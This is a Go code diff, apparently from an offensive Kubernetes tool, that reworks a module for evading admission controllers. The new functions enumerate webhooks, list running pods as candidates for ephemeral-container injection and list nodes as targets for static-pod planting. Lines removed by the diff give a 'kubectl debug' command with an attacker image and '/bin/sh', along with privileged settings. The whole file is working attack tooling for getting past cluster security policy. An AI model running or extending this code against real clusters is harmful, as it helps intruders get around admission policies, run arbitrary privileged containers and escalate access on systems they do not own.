@@ -5,43 +5,35 @@ import (
 	"fmt"
 	"strings"
 
+	corev1 "k8s.io/api/core/v1"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 	"k8s.io/client-go/kubernetes"
-	"k8s.io/client-go/rest"
 )
 
+// AdmissionController describes a discovered webhook admission controller.
 type AdmissionController struct {
 	Name     string
 	Type     string
 	Webhooks []string
 }
 
-func EvadeAdmissionControllers(ctx context.Context, technique string) (*EvasionResult, error) {
+// EvadeAdmissionControllers executes the specified admission controller evasion technique.
+func EvadeAdmissionControllers(ctx context.Context, client kubernetes.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "enumerate":
-		return enumerateWebhooks(ctx)
+		return enumerateWebhooks(ctx, client)
 	case "bypass_labels":
-		return bypassViaLabels(ctx)
+		return bypassViaLabels(ctx, client)
 	case "ephemeral":
-		return ephemeralContainerBypass(ctx)
+		return ephemeralContainerBypass(ctx, client)
 	case "static_pod":
-		return staticPodBypass(ctx)
+		return staticPodBypass(ctx, client)
 	default:
-		return enumerateWebhooks(ctx)
+		return enumerateWebhooks(ctx, client)
 	}
 }
 
-func enumerateWebhooks(ctx context.Context) (*EvasionResult, error) {
-	config, err := rest.InClusterConfig()
-	if err != nil {
-		return &EvasionResult{Technique: "enumerate", Success: false, Output: err.Error()}, nil
-	}
-
-	client, err := kubernetes.NewForConfig(config)
-	if err != nil {
-		return &EvasionResult{Technique: "enumerate", Success: false, Output: err.Error()}, nil
-	}
-
+func enumerateWebhooks(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
 	sb.WriteString("Admission Controller Enumeration:\n\n")
 
@@ -87,17 +79,7 @@ func enumerateWebhooks(ctx context.Context) (*EvasionResult, error) {
 	}, nil
 }
 
-func bypassViaLabels(ctx context.Context) (*EvasionResult, error) {
-	config, err := rest.InClusterConfig()
-	if err != nil {
-		return &EvasionResult{Technique: "bypass_labels", Success: false, Output: err.Error()}, nil
-	}
-
-	client, err := kubernetes.NewForConfig(config)
-	if err != nil {
-		return &EvasionResult{Technique: "bypass_labels", Success: false, Output: err.Error()}, nil
-	}
-
+func bypassViaLabels(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
 	sb.WriteString("Admission Controller Label Bypass:\n\n")
 
@@ -134,21 +116,30 @@ func bypassViaLabels(ctx context.Context) (*EvasionResult, error) {
 	}, nil
 }
 
-func ephemeralContainerBypass(_ context.Context) (*EvasionResult, error) {
+func ephemeralContainerBypass(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
 	sb.WriteString("Ephemeral Container Bypass:\n\n")
-	sb.WriteString("  Many admission controllers don't validate ephemeral container specs.\n")
-	sb.WriteString("  Ephemeral containers bypass:\n")
+
+	pods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
+		Limit: 10,
+	})
+	if err != nil {
+		return &EvasionResult{Technique: "ephemeral", Success: false, Output: fmt.Sprintf("failed to list pods: %v", err)}, nil
+	}
+
+	sb.WriteString("  Candidate pods for ephemeral container injection:\n")
+	for _, pod := range pods.Items {
+		if pod.Status.Phase == corev1.PodRunning {
+			fmt.Fprintf(&sb, "    %s/%s (containers: %d)\n", pod.Namespace, pod.Name, len(pod.Spec.Containers))
+		}
+	}
+
+	sb.WriteString("\n  Ephemeral containers bypass:\n")
 	sb.WriteString("    - Pod security policies/standards\n")
 	sb.WriteString("    - Image allowlists\n")
 	sb.WriteString("    - Resource quota enforcement\n")
 	sb.WriteString("    - Security context constraints\n\n")
-	sb.WriteString("  Attack: Add ephemeral container to existing pod with:\n")
-	sb.WriteString("    - privileged: true\n")
-	sb.WriteString("    - hostPID: true (inherited from pod)\n")
-	sb.WriteString("    - arbitrary image\n\n")
-	sb.WriteString("  kubectl debug <pod> --image=attacker:latest --target=<container> -- /bin/sh\n")
-	sb.WriteString("  API equivalent: PATCH /api/v1/namespaces/<ns>/pods/<pod>/ephemeralcontainers\n")
+	sb.WriteString("  API: PATCH /api/v1/namespaces/<ns>/pods/<pod>/ephemeralcontainers\n")
 
 	return &EvasionResult{
 		Technique: "ephemeral",
@@ -157,22 +148,29 @@ func ephemeralContainerBypass(_ context.Context) (*EvasionResult, error) {
 	}, nil
 }
 
-func staticPodBypass(_ context.Context) (*EvasionResult, error) {
+func staticPodBypass(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
 	sb.WriteString("Static Pod Bypass:\n\n")
-	sb.WriteString("  Static pods are managed directly by kubelet, bypassing ALL admission controllers.\n\n")
-	sb.WriteString("  Requirements:\n")
-	sb.WriteString("    - Write access to node filesystem (via hostPath or container escape)\n")
-	sb.WriteString("    - Knowledge of static pod manifest path\n\n")
-	sb.WriteString("  Common static pod paths:\n")
+
+	nodes, err := client.CoreV1().Nodes().List(ctx, metav1.ListOptions{})
+	if err != nil {
+		return &EvasionResult{Technique: "static_pod", Success: false, Output: fmt.Sprintf("failed to list nodes: %v", err)}, nil
+	}
+
+	sb.WriteString("  Cluster nodes (static pod targets):\n")
+	for _, node := range nodes.Items {
+		role := "worker"
+		if _, ok := node.Labels["node-role.kubernetes.io/control-plane"]; ok {
+			role = "control-plane"
+		}
+		fmt.Fprintf(&sb, "    %s (%s)\n", node.Name, role)
+	}
+
+	sb.WriteString("\n  Static pods bypass ALL admission controllers.\n")
+	sb.WriteString("  Common manifest paths:\n")
 	sb.WriteString("    - /etc/kubernetes/manifests/\n")
-	sb.WriteString("    - /etc/kubelet.d/\n")
-	sb.WriteString("    - Custom path from --pod-manifest-path kubelet flag\n\n")
-	sb.WriteString("  Drop a pod manifest in the static pod directory:\n")
-	sb.WriteString("    - No admission webhook validation\n")
-	sb.WriteString("    - No OPA/Gatekeeper policy enforcement\n")
-	sb.WriteString("    - No Kyverno policy check\n")
-	sb.WriteString("    - Pod runs with any security context specified\n")
+	sb.WriteString("    - /etc/kubelet.d/\n\n")
+	sb.WriteString("  Requires write access to node filesystem via hostPath or container escape.\n")
 
 	return &EvasionResult{
 		Technique: "static_pod",
